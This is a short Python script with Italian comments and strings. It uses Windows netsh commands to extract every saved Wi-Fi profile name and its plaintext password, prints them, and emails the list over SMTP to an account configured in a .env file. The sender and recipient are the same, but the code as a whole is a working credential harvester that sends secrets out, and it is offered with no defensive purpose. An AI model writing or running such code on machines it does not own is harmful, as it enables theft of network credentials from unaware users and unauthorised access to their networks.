import subprocess
import re
import smtplib
import os
from dotenv import load_dotenv

def get_wifi_credentials():
    profiles_data = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True).stdout
    profiles = re.findall(r"Tutti i profili utente\s*:\s(.*)", profiles_data)
    
    wifi_credentials = []
    
    for profile in profiles:
        profile = profile.strip()
        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", profile, "key=clear"], capture_output=True, text=True).stdout
        
        password_match = re.search(r"Contenuto chiave\s*:\s(.+)", profile_info)
        
        if password_match:
            wifi_credentials.append((profile, password_match.group(1).strip()))
        else:
            wifi_credentials.append((profile, "[Nessuna password trovata]"))
    
    return wifi_credentials

def send_email(wifi_credentials):
    load_dotenv()
    email_user = os.getenv("EMAIL_USER")
    email_password = os.getenv("EMAIL_PASSWORD")
    smtp_server = os.getenv("SMTP_SERVER", "smtp.gmail.com")
    smtp_port = int(os.getenv("SMTP_PORT", 587))
    
    recipient = email_user  # Invia l'email a sé stessi
    subject = "Credenziali WiFi Estratte"
    
    if not wifi_credentials:
        body = "Nessun SSID trovato."
    else:
        body = "\n".join([f"SSID: {ssid} - Password: {password}" for ssid, password in wifi_credentials])
    
    message = f"Subject: {subject}\n\n{body}"
    
    try:
        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.starttls()
            server.login(email_user, email_password)
            # Codifica il messaggio in UTF-8 per evitare errori di codifica
            server.sendmail(email_user, recipient, message.encode('utf-8'))
        print("Email inviata con successo!")
    except Exception as e:
        print(f"Errore nell'invio dell'email: {e}")


wifi_data = get_wifi_credentials()
print("SSID e Password trovati:")
for ssid, password in wifi_data:
    print(f"SSID: {ssid}, Password: {password}")
send_email(wifi_data)
